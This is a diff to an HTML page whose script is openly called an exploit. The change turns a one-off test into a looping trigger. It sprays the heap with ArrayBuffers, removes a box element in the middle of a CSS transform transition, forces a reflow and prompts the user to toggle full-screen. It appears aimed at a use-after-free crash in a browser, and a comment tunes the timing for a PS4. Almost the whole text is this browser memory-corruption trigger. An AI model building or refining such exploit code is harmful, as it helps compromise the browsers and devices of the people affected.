@@ -7,65 +7,68 @@
       width: 100px;
       height: 100px;
       background: red;
-      transition: all 1s;
+      transition: transform 0.5s linear;
+      position: absolute;
+      left: 0;
+      top: 50%;
     }
     #status {
       font-family: Arial;
       color: white;
       background: black;
       padding: 10px;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
     }
   </style>
 </head>
-<body style="background: #000;">
+<body style="background: #000; height: 200vh;"> <!-- Extra height for scrolling -->
   <div id="box"></div>
-  <div id="status">Waiting for interaction...</div>
+  <div id="status">CLICK TO START | WAIT FOR 'CRASH NOW!'</div>
 
   <script>
     const box = document.getElementById('box');
     const status = document.getElementById('status');
+    let isTransitioning = false;
 
-    // Heap spray (attempt to control memory layout)
+    // Heap spray to increase memory pressure
     function heapSpray() {
-      const spray = new Array(1000);
-      for (let i = 0; i < spray.length; i++) {
-        spray[i] = new ArrayBuffer(0x10000); // Allocate memory
+      window.spray = [];
+      for (let i = 0; i < 500; i++) {
+        window.spray.push(new ArrayBuffer(0x10000));
       }
-      return spray;
     }
 
-    // Main exploit test
-    function triggerExploit() {
-      status.textContent = "Triggering transition...";
-      
-      // Force layout calculation
-      getComputedStyle(box).transform;
-
-      // Start CSS transition
-      box.style.transform = 'translateX(300px)';
-
-      // Remove element mid-transition
+    // Reset box position and restart transition
+    function restartTransition() {
+      box.style.transform = 'translateX(0)';
       setTimeout(() => {
-        status.textContent = "Removing element...";
-        box.remove();
-
-        // Force reflow (layout thrashing)
-        document.body.offsetHeight;
-
-        // Optional: Reload (may worsen crash)
-        // location.href = "?crash=1";
-
-        // Enter full-screen (if possible)
-        status.textContent = "Try FULLSCREEN NOW! (Crash on exit)";
-      }, 50);
+        box.style.transform = 'translateX(300px)';
+        isTransitioning = true;
+        status.textContent = "TRANSITIONING... WAIT FOR 'CRASH NOW!'";
+      }, 10);
     }
 
-    // Start test after user clicks (avoid auto-triggering)
-    status.textContent = "CLICK ANYWHERE TO START TEST";
-    document.body.addEventListener('click', () => {
+    // Main exploit trigger
+    function triggerExploit() {
       heapSpray();
-      triggerExploit();
-    });
+      restartTransition();
+
+      // Loop the transition to prolong vulnerable state
+      setInterval(restartTransition, 1000);
+
+      // Schedule the forced reflow + crash window
+      setTimeout(() => {
+        status.textContent = "CRASH NOW! ENTER/EXIT FULL-SCREEN!";
+        box.remove();
+        document.body.offsetHeight; // Force reflow
+      }, 800); // Adjusted delay for PS4's slow full-screen
+    }
+
+    // Start on click
+    document.body.addEventListener('click', triggerExploit);
   </script>
 </body>
 </html>
